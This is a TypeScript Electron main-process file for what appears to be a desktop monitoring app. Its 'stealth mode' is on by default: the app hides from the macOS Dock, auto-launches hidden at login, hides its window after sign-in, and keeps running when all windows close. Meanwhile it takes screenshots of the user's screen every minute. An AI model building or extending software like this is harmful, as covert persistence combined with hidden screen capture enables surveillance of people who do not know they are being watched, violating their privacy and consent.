/**
 * Main Process Entry Point
 * Handles application lifecycle, window management, and initialization
 */

import { app, BrowserWindow, protocol, ipcMain } from 'electron';
import log from 'electron-log';
import Store from 'electron-store';
import path from 'path';
import { createMainWindow } from './windows/mainWindow';
import { setupIpcHandlers } from './handlers';
import { initializeServices } from './services';
import { setupSystemTray } from './tray/systemTray';
import { setupAutoUpdater } from './services/autoUpdater';
import { setupSecurityPolicies } from './security/policies';

// Configure logging
log.transports.file.level = 'info';
log.transports.console.level = 'debug';

// Initialize electron-store
const store = new Store();

// Global reference to main window
let mainWindow: BrowserWindow | null = null;
let onboardingWindow: BrowserWindow | null = null;

// Check if running in development
const isDevelopment = process.env.NODE_ENV === 'development';
const isProduction = !isDevelopment;

// Stealth mode configuration
const STEALTH_MODE_ENABLED = process.env.STEALTH_MODE !== 'false'; // Default: enabled

// STEALTH MODE: Hide from dock on macOS
if (STEALTH_MODE_ENABLED && process.platform === 'darwin') {
  app.dock.hide();
  log.info('Stealth mode: Hidden from macOS Dock');
}

// STEALTH MODE: Auto-launch on system startup
if (STEALTH_MODE_ENABLED) {
  app.setLoginItemSettings({
    openAtLogin: true,
    openAsHidden: true,
  });
  log.info('Stealth mode: Auto-launch enabled');
}

/**
 * Check if user is authenticated
 */
function isUserAuthenticated(): boolean {
  const user = store.get('user', null);
  const accessToken = store.get('accessToken', null);
  const isAuthenticated = !!(user && accessToken);
  log.info(`Authentication check - User: ${!!user}, Token: ${!!accessToken}, Authenticated: ${isAuthenticated}`);
  
  // For now, always return false to force auth screen
  log.info('Forcing auth screen for testing');
  return false;
}

/**
 * Create auth window (login/register)
 */
function createAuthWindow(): BrowserWindow {
  log.info('Creating auth window...');
  
  onboardingWindow = new BrowserWindow({
    width: 1000,
    height: 700,
    show: true,
    resizable: false,
    webPreferences: {
      preload: path.join(app.getAppPath(), 'dist-electron/preload/src/preload/index.js'),
      nodeIntegration: false,
      contextIsolation: true,
      sandbox: false, // Temporarily disabled to test preload script
      webSecurity: true,
    },
  });

  // Open DevTools for debugging
  if (isDevelopment) {
    onboardingWindow.webContents.openDevTools();
  }

  // Load auth page (login/register)
  if (isDevelopment) {
    onboardingWindow.loadURL('http://localhost:5173/login');
  } else {
    onboardingWindow.loadFile(path.join(__dirname, '../../../dist/index.html'), {
      hash: '/login'
    });
  }

  // Log when page finishes loading
  onboardingWindow.webContents.on('did-finish-load', () => {
    log.info('Auth window finished loading');
  });

  onboardingWindow.on('closed', () => {
    onboardingWindow = null;
    log.info('Auth window closed');
  });

  log.info('Auth window created');
  return onboardingWindow;
}

/**
 * Create the main application window
 */
async function createWindow() {
  try {
    log.info('Creating main window...');
    
    // Create the main window (hidden initially if stealth mode)
    mainWindow = createMainWindow(isDevelopment, STEALTH_MODE_ENABLED);

    // Setup IPC handlers
    setupIpcHandlers(mainWindow, store);

    // Initialize services
    await initializeServices(mainWindow, store);

    // Setup system tray
    setupSystemTray(mainWindow, store);

    // Setup auto updater (production only)
    if (isProduction) {
      setupAutoUpdater(mainWindow);
    }

    log.info('Main window created successfully');
  } catch (error) {
    log.error('Error creating main window:', error);
    throw error;
  }
}

/**
 * Start automatic screenshot capture
 */
let screenshotInterval: NodeJS.Timeout | null = null;
const SCREENSHOT_INTERVAL = 60 * 1000; // 1 minute

async function startAutomaticScreenshots() {
  log.info('Starting automatic screenshot capture...');
  
  // Import the screenshot manager directly
  const { ScreenshotManager } = await import('./services/monitoring/screenshotManager');
  const screenshotManager = new ScreenshotManager(mainWindow!, store);
  
  // Capture immediately on start
  try {
    const screenshots = await screenshotManager.captureScreenshot();
    log.info(`Initial capture: ${screenshots.length} screenshot(s) saved`);
  } catch (error) {
    log.error('Error in initial screenshot capture:', error);
  }
  
  // Then capture every minute
  screenshotInterval = setInterval(async () => {
    try {
      const screenshots = await screenshotManager.captureScreenshot();
      log.info(`Automatic capture: ${screenshots.length} screenshot(s) saved`);
    } catch (error) {
      log.error('Error in automatic screenshot capture:', error);
    }
  }, SCREENSHOT_INTERVAL);
  
  log.info(`Automatic screenshots enabled (every ${SCREENSHOT_INTERVAL / 1000} seconds)`);
}

/**
 * Stop automatic screenshot capture
 */
function stopAutomaticScreenshots() {
  if (screenshotInterval) {
    clearInterval(screenshotInterval);
    screenshotInterval = null;
    log.info('Automatic screenshots stopped');
  }
}

/**
 * Handle successful authentication
 */
ipcMain.on('auth-success', async (_event, authData) => {
  log.info('Authentication successful:', authData.user?.email);
  
  // Close auth window
  if (onboardingWindow && !onboardingWindow.isDestroyed()) {
    onboardingWindow.close();
    log.info('Auth window closed');
  }
  
  // Create main window if not already created
  if (!mainWindow) {
    await createWindow();
    log.info('Main window created after authentication');
    
    // In stealth mode, keep window hidden
    if (STEALTH_MODE_ENABLED) {
      setTimeout(() => {
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.hide();
          log.info('Stealth mode: Main window hidden');
        }
      }, 100);
    }
    
    // Start automatic screenshot capture
    startAutomaticScreenshots();
  }
});

// Register custom protocols BEFORE app is ready
protocol.registerSchemesAsPrivileged([
  {
    scheme: 'app',
    privileges: {
      standard: true,
      secure: true,
      supportFetchAPI: true,
    },
  },
]);

/**
 * Initialize the application
 */
async function initializeApp() {
  try {
    log.info('Initializing application...');

    // Setup security policies
    setupSecurityPolicies();

    log.info('Application initialized successfully');
  } catch (error) {
    log.error('Error initializing application:', error);
    throw error;
  }
}

/**
 * Application ready handler
 */
app.whenReady().then(async () => {
  try {
    await initializeApp();
    
    // Setup IPC handlers BEFORE creating any windows
    setupIpcHandlers(null as any, store);
    log.info('IPC handlers registered');
    
    // Check if user is authenticated
    if (!isUserAuthenticated()) {
      // Not authenticated: Show login/register
      log.info('User not authenticated - showing auth window');
      createAuthWindow();
    } else {
      // Already authenticated: Create main window (hidden if stealth mode)
      log.info('User authenticated - creating main window');
      await createWindow();
      
      // In stealth mode, keep window hidden
      if (STEALTH_MODE_ENABLED && mainWindow) {
        mainWindow.hide();
        log.info('Stealth mode: Main window hidden');
      }
      
      // Start automatic screenshot capture
      startAutomaticScreenshots();
    }

    // macOS: Re-create window when dock icon is clicked
    app.on('activate', () => {
      if (BrowserWindow.getAllWindows().length === 0) {
        if (isUserAuthenticated()) {
          createWindow();
        } else {
          createAuthWindow();
        }
      } else if (mainWindow) {
        mainWindow.show();
      }
    });
  } catch (error) {
    log.error('Error in app ready handler:', error);
    app.quit();
  }
});

/**
 * Window all closed handler
 */
app.on('window-all-closed', () => {
  // In stealth mode, keep app running in background
  if (STEALTH_MODE_ENABLED) {
    log.info('Stealth mode: App continues running in background');
    return;
  }
  
  // On macOS, keep the app running even when all windows are closed
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

/**
 * Before quit handler
 */
app.on('before-quit', () => {
  log.info('Application is quitting...');
  
  // Stop automatic screenshots
  stopAutomaticScreenshots();
  
  // Cleanup will be handled by individual services
});

/**
 * Handle second instance launch
 */
const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
  log.warn('Another instance is already running');
  app.quit();
} else {
  app.on('second-instance', () => {
    // Focus the main window if someone tries to open another instance
    if (mainWindow) {
      if (mainWindow.isMinimized()) {
        mainWindow.restore();
      }
      mainWindow.focus();
    }
  });
}

/**
 * Handle uncaught exceptions
 */
process.on('uncaughtException', (error) => {
  log.error('Uncaught exception:', error);
});

process.on('unhandledRejection', (reason) => {
  log.error('Unhandled rejection:', reason);
});

// Export for testing
export { mainWindow };

